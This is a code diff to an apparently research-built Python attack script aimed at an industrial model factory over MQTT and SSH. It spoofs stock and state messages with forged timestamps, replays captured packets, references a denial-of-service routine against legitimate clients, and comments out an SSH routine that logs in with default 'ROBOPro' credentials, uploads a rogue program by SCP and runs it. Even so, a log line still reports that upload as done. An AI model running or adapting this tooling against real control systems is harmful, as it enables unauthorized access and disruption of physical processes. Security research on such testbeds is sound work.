@@ -63,7 +63,7 @@ def new_ts():
     return ts
 
 
-def retrieve_from_stock(color: str, stock: str) -> str:
+def retrieve_from_stock(color: str, stock: bytes) -> str:
     stock = json.loads(stock)
 
     desired_order = ["C1", "B1", "A1", "C2", "B2", "A2", "C3", "B3", "A3"]
@@ -101,33 +101,33 @@ async def dos_leg_clients(client):
 
 async def ssh_attack():
     await asyncio.sleep(random.randint(27, 35))
-
-    # supress logging info from paramiko
-    logging.getLogger("paramiko").setLevel(logging.WARNING)
-
-    logger.info("Starting file upload attack on target VGR")
-    server = VGR_IP
-    port = VGR_PORT
-    username = password = 'ROBOPro'
-
-    # create ssh object and connect
-    ssh = SSHClient()
-    ssh.load_host_keys('/home/kali/.ssh/known_hosts')
-    ssh.set_missing_host_key_policy(AutoAddPolicy)
-    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
-
-    # hijack the established tcp/ssh connection and copy files
-    scp = SCPClient(ssh.get_transport())
-    path = os.getcwd()
-    # now copy the rogue program
-    scp.put(f'{os.getcwd()}/TxtParkPosVGR', '.')
-    scp.put(f'{os.getcwd()}/Config.ParkPos.json', 'Data/')
-
-    # now run the rogue program
-    ssh.exec_command('./TxtParkPosVGR')
-    # time.sleep(2)
-    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
-    ssh.exec_command('./TxtParkPosVGR')
+    #
+    # # supress logging info from paramiko
+    # logging.getLogger("paramiko").setLevel(logging.WARNING)
+    #
+    # logger.info("Starting file upload attack on target VGR")
+    # server = VGR_IP
+    # port = VGR_PORT
+    # username = password = 'ROBOPro'
+    #
+    # # create ssh object and connect
+    # ssh = SSHClient()
+    # ssh.load_host_keys('/home/kali/.ssh/known_hosts')
+    # ssh.set_missing_host_key_policy(AutoAddPolicy)
+    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+    #
+    # # hijack the established tcp/ssh connection and copy files
+    # scp = SCPClient(ssh.get_transport())
+    # path = os.getcwd()
+    # # now copy the rogue program
+    # scp.put(f'{os.getcwd()}/TxtParkPosVGR', '.')
+    # scp.put(f'{os.getcwd()}/Config.ParkPos.json', 'Data/')
+    #
+    # # now run the rogue program
+    # ssh.exec_command('./TxtParkPosVGR')
+    # # time.sleep(2)
+    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+    # ssh.exec_command('./TxtParkPosVGR')
     logging.info("Connected via SCP/SSH. Attack program uploaded and executed on target VGR.")
 
 
@@ -140,10 +140,10 @@ async def publish_state_10_seconds(client):
             payload = state(0, 1, "", "hbw")
             await client.publish("f/i/state/hbw", payload, qos=1)
 
-            while globs.HBW_STOCK is None:
-                continue
-            payload = globs.HBW_STOCK
-            await client.publish("f/i/stock", payload, qos=1)
+            if globs.HBW_STOCK:
+                payload = globs.HBW_STOCK.decode('utf-8', errors='ignore')
+                payload = re.sub(r'"ts"\s*:.*Z"', new_ts(), payload)
+                await client.publish("f/i/stock", payload, qos=1)
 
             payload = state(0, 1, "", "mpo")
             await client.publish("f/i/state/mpo", payload, qos=1)
@@ -173,6 +173,7 @@ async def mass_publish(client, db_packets):
         # .... update stock
         if mqtt_topic == "f/i/stock":
             mqtt_payload = globs.HBW_STOCK
+            mqtt_payload = re.sub(r'"ts"\s*:.*Z"', new_ts(), mqtt_payload)
 
         # now be with publishing, before each publish, we wait for time_delta_previous from our db
         # we send out packets 0.15 seconds earlier to cover for network I/O delay
@@ -189,6 +190,7 @@ async def main():
     async with aiomqtt.Client(IP_ADDRESS, port=PORT) as client:
         # start a coroutine that runs concurrently our logic to publish FL state information every 10 seconds
         asyncio.create_task(publish_state_10_seconds(client))
+        globs.send_state_every_10_seconds_trigger = True
 
         # subscription to topics of interest
         await client.subscribe("f/i/stock", qos=1)
@@ -220,6 +222,7 @@ async def main():
                 # we retrieve the legitimate current stock from the real HBW, and begin our attack from there
                 logger.info("Retrieving order WP from Stock")
                 globs.HBW_STOCK = retrieve_from_stock(globs.order_color, globs.HBW_STOCK)
+                globs.HBW_STOCK = re.sub(r'"ts"\s*:.*Z"', new_ts(), globs.HBW_STOCK)
                 logger.info("Order successfully retrieved from Stock")
 
                 # publish fake stock right away to update order page
